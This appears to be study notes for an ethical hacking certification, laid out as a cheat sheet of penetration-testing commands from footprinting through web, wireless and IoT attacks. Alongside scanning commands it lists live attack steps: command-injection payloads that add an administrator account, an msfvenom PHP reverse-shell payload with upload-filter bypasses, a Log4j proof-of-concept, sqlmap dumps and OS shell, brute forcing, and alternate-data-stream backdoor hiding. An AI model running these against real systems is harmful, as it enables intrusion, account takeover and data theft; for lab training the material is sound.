# Ethical Hacking & Penetration Testing Toolkit

## Footprinting

* **Whois**: [https://www.whois.com/whois/](https://www.whois.com/whois/)
* **Netcraft**
* **ipvoid.com**
* **PeekYou**: Web footprinting for personal info
* **Ping command**:

  * Know the IP address: `ping www.example.com`
  * Know the packet size before dropping: `ping www.certifiedhacker.com -f -l 1472`
* **Photon**:

  * `python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback`
* **Web Data Extractor**: Emails and more
* **grecon**: Subdomains, WordPress detection, login pages
* **ARIN Whois**: Find the network range
* **Centrlops**
* **Access tools in Windows**: `Ctrl+L >> smb://[IP]`

## Scanning

* **GUI Network Scanners**: MegaPing, NetScanTools Pro
* **Nmap**:

  * Full open scan: `nmap -sT -v [IP]`
  * Aggressive scan: `nmap -T4 -A [IP]`
  * Live hosts: `nmap -sn -PE [range]`
  * Web server identification: `nmap -p 80,443 --script http-title [ip-range]`
* **Hping3**:

  * `hping3 -A [IP] -p 80 -c 5`
  * `hping3 --scan 0-100 -S [IP]`
  * `hping3 -8 0-100 -S [IP] -V`

## Enumeration

* **NetBIOS (Windows)**:

  * `nbtstat -a [IP]`
  * `nbtstat -c`
  * `net use`
* **NetBIOS (Linux)**:

  * `nmap -sV -v --script nbstat.nse [IP]`
  * `nmap -sU -p 137 --script nbstat.nse [IP]`
* **SNMP**:

  * `snmp-check [IP]`
  * **GUI**: SoftPerfect Network Scanner
  * `snmpwalk -v1 -c public [IP]`
  * `snmpwalk -v2c -c public [IP]`
  * `nmap -sU -p 161 --script=snmp-sysdescr [IP]`
  * `nmap -sU -p 161 --script=snmp-processes [IP]`
  * `nmap -sU -p 161 --script=snmp-win32-software [IP]`
  * `nmap -sU -p 161 --script=snmp-interfaces [IP]`
* **LDAP**:

  * GUI: AD Explorer
  * CLI:

    * `ldapsearch -h [IP] -x -s base namingcontexts`
    * `ldapsearch -h [IP] -x -b "DC=CEH,DC=com"`
    * `ldapsearch -x -h [IP] -b "DC=CEH,DC=com" "objectclass=*"`
* **NFS**:

  * `./superenum`
  * `python3 rpc-scan.py [IP] --rpc`
* **DNS**:

  * `dig ns [domain]`
  * `dig @[NS] [domain] axfr`
  * In Windows:

    * `nslookup`
    * `set type=soa`
    * `[target domain]`
  * `./dnsrecon.py -d [domain] -z`
  * `nmap --script=broadcast-dns-service-discovery [domain]`
* **SMTP**:

  * `nmap -p 25 --script=smtp-enum-users [IP]`
  * `nmap -p 25 --script=smtp-open-relay [IP]`
  * `nmap -p 25 --script=smtp-commands [IP]`
* **SMB**: nmap --script smb-security-mode -p 445 192.168.0.51

## Vulnerability Analysis

* **OpenVAS**
* **Nessus**
* **Nikto**:

  * `nikto -h [site] -Tuning x`
  * `nikto -h [site] -Cgidirs all`

## System Hacking

* **Responder**: `responder -I eth0`
* **L0pht Crack**
* **NTFS File Hiding**:

  * `type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe`
  * `mklink backdoor.exe readme.txt:calc.exe`
* **Steganography**:

  * `snow -C -p "magic" readme2.txt`
  * Tools: OpenStego, [https://stegonline.georgeom.net/upload](https://stegonline.georgeom.net/upload)

## Malware Analysis

* **Static**:

  * BinText, DIE, PE Explorer, Ghidra
* **Dynamic**:

  * TCPView, Reg Organizer

## Sniffing

* **Wireshark**: `http.request.method == POST`
* **MacChanger (Linux)**: `macchanger -a eth0`
* **Cain & Abel**: ARP poisoning detection
* **Nmap**: `--script=sniffer-detect [IP]`

## Social Engineering

* SET Toolkit
* Netcraft Extension

## DoS

* Anti DDoS Guardian

## Session Hijacking

* ZAP, Bettercap

## Web Server Hacking

* `python3 ghost_eye.py`
* HttpRecon GUI
* Netcat: `nc -vv www.moviescope.com 80`
* Telnet: `telnet www.moviescope.com 80` → `GET / HTTP/1.0`
* Nmap:

  * `nmap -sV --script=http-enum [site]`
  * `nmap --script hostmap-bfk --script-args hostmap-bfk.prefix=hostmap- [site]`
  * `nmap --script http-trace -d [site]`
  * `nmap -sV --script http-waf-detect [site]`

## Uniscan

* Directories: `uniscan -u http://url -q`
* File Check: `uniscan -u http://url -we`
* Dynamic: `uniscan -u http://url -d`

## Brute Force

* `hydra -L [Usernames.txt] -P [Passwords.txt] ftp://[IP]`

## Web Application Hacking

* **whatweb**:

  * `whatweb -v [Target]`
  * `whatweb --log-verbose=Report TARGET.COM`
* **Load Balancer Detection**:

  * `dig yahoo.com`, then `lbd yahoo.com`
* **Directory Enumeration**:

  * `gobuster dir -u [Target] -w [wordlist]`
  * `python3 dirsearch.py -u http://[site]`
* **Clickjacking Detection**: ClickjackPoc
*  **identify content management : wig www.cehorg.com
* **WordPress**:

  * Login page: `wp-login.php`
  * `wpscan --api-token [token] --url http://example --enumerate u`
  * wpscan --url http://cehorg.com/wp-login.php -U <username.txt> -P <password.txt>
* **XSS Detection**: `python3 pwnxss.py -u http://example`
* **DVWA - Command Injection**:

  * `| whoami`, `| hostname`, `| dir C:\`, etc.
  * to read file : | type
  * Add user: `| net user Test /Add`
  * Grant admin: `| net localgroup Administrators Test /Add`

**File Upload Exploitation**:

* Payload:

  * `msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw`
* Upload to vulnerable page, then:

  * `use exploit/multi/handler`
  * `set payload php/meterpreter/reverse_tcp`
  * `run`
* Bypass Techniques:

  * Medium: Save as `.jpg`, intercept with BurpSuite and change to `.php`
  * High: Add `GIF89a` magic bytes, save as `.jpeg`, then copy via `|copy .jpeg .php`

## Log4j Exploitation

* Setup:

  * `tar -xf jdk-8u202-linux-x64.tar.gz`
  * `mv jdk1.8.0_202 /usr/bin/`
  * Update lines 62,87,99 in `poc.py` to use `/usr/bin/jdk1.8.0_202/bin/java`
  * Listener: `nc -lvp 9001`
  * Run PoC: `python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001`

## SQL Injection

* **sqlmap**:

  * `sqlmap -u "http://example.com/viewprofile.aspx?id=1" --cookie="..." --dbs`
  * `sqlmap -u "..." -D db --tables`
  * `sqlmap -u "..." -D db -T table --dump`
  * `--os-shell` to gain OS shell
* **DSSS**:

  * `python3 dsss.py -u "http://example.com/viewprofile.aspx?id=1" --cookie="..."`

## Wireless Network Hacking

* **WEP**: `aircrack-ng [path.cap]`
* **WPA2**: `aircrack-ng -a2 -b [BSSID] -w [wordlist] [packet.cap]`

## Mobile Platform Hacking

* **PhoneSploit**: `python3 phonesploit.py`
* **APK Analysis**: [https://www.sisik.eu/apk-tool](https://www.sisik.eu/apk-tool)

## IoT Hacking

* Shodan
* MQTT Port: `1883`

## Cryptography

* HashCalc
* MD5 Hashing
* BCTextEncoder
* VeraCrypt
* CrypTool
* AlphaPeeler
